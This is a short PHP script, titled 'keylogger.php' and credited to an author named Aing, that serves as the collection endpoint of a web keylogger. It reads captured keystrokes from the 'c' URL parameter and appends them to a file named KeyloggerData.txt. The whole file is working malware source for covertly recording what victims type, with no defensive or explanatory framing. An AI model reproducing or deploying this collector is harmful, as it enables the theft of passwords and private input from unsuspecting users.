<?php
// keylogger.php by Aing
 
if(!empty($_GET['c'])) {
    $logfile = fopen('KeyloggerData.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
